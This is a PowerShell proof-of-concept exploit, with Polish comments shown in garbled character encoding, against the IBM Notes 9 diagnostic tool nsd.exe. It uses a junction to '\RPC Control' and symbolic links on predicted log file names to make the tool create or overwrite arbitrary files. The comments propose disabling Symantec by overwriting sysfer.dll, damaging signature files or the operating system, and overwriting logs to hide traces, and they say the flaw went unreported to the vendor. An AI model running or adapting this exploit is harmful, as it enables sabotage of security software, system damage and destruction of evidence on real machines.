#powershell -NoP -ExecutionPolicy UnRestricted -file "C:\Users\[redacted]\Desktop\IBM-Local DoS EoP\MakeRedirection.ps1"

######################
#
# IBM Notes 9 (9.01.14050)
# C:\Program Files (x86)\IBM\Notes\nsd.exe Lazy POC Exploit
# Arbitrary File Overwrite / Creation 
#
# Nazwa produktu IBM wnsd
# Wersja pliku: 9.0.10.13287 
# Wersja produktu: 9.0.10.3261
# 
# Tested on: Microsoft Windows 10 Enterprise, Windows 11 Home 
#            10.0.19044 N/A Build 19044
#
# --------------------
# 
# Nie mamy pe³nej kontroli nad danymi, które s¹ zapisywane do pliku. 
# Próbowa³em u¿yæ aliasów poleceñ, ale wygl¹da na to ¿e nie posiadaj¹c odpowiednich uprawnieñ
# nie ma mo¿liwoœci zdefiniowania aliasów, jest jeszcze opcja z nadu¿yciem zmiennych œrodowiskowych i kolejnoœci przeszukiwania folderów,
# ale tylko przy spe³nieniu dodatkowych warunków.
# B³¹d mo¿e zostaæ wykorzystany do nadpisywania plików np. mo¿emy postaraæ siê nadpisaæ pliki systemów detekcji 
# np. symanteka tak aby siê wiêcej nie uruchomi³ lub uruchomi³ sie upoœledzony (sysfer.dll to œwietny kandydat), 
# mo¿emy te¿ próbowaæ nadpisywaæ pliki sygnatur lub poprostu uszkodziæ 
# system operacyjny lub wybran¹ aplikacje. Oczywiœcie mo¿emy te¿ nadpisywaæ logi w celu zacierania œladów.
# 
# Nie wiem czy b³¹d wystêpuje w wersjach póŸniejszych ni¿ 9.0.10.13.287, nie wiem równie¿ czy IBM (HCL) o nim wie, 
# mia³em w planach poinformowaæ dostawcê, ale za du¿o kont trzeba za³o¿yæ i w ogóle tak mi siê jakoœ odechcia³o.
#
# --------------------
# TODO:  Ewentualne zg³oszenie do IBM lub HCL (trudno orzec)
#
# ////////////////////
#
######################


$N = 59;

$user_name = $env:UserName;

$target_path = "C:\Users\"+$user_name+"\AppData\Local\IBM\Notes\Data\"; 

if (!(Test-Path -Path $target_path)) { 
    Write-output "Directory "$target_path" not exists!";
    Exit;
}
  
$target_path = $target_path + "IBM_TECHNICAL_SUPPORT"; 

if(Test-Path -Path $target_path ) {

   if( (Get-Item $target_path).LinkType -eq "Junction") {

        Remove-Item -Force $target_path;

   }
   else {
         Rename-Item $target_path "IBM_TECHNICAL_SUPPORT - old";
   }

} else {
  Write-output "Directory "$target_path" not exists!";
  Exit;
}

$tools_path = (Get-Location).Path;

&$tools_path'\createMountPoint.exe' $target_path '"\RPC Control"' #...


#FORMAT NAZWY PLIKU 
#
#nsd_W32I_XXX-6666_2022_10_24@10_19_27
#
#nsd_ <- sta³e
#W32I_ <- znane
#XXX-6666_ <- nazwa komputera
#2022_10_24@10_19_27 <- data w formacie YYYY-MM-DD@HH_MM_SS

$computer_name = $env:COMPUTERNAME;

$log_file_name = "nsd_W32I_"+$computer_name+"_"

Write-OutPut $log_file_name;


for( $i=0; $i -lt 3; $i++) { 

    for( $j=0; $j -lt $N; $j++) {

         $time = (Get-Date).AddMinutes($i).AddSeconds($j).toString("yyyy_MM_dd@HH_mm_ss");

         $rpc_file_name = $log_file_name + $time +".log";

         Write-output $rpc_file_name;

         $args = '"\RPC Control\'+$rpc_file_name+'" "\??\C:\ECHO_POWNED_VIA_IBM_1337.log.dll.bat"';

         Start-Process -NoNewWindow -FilePath $tools_path'\createNativeSymLink.exe' -ArgumentList $args;

    } 

}

Start-Process -Wait -FilePath "C:\Program Files (x86)\IBM\Notes\nsd.exe" -ArgumentList "-hang";

Start-Process -FilePath "C:\WINDOWS\System32\taskkill.exe" -ArgumentList "/F /IM CreateNativeSymLink.exe";
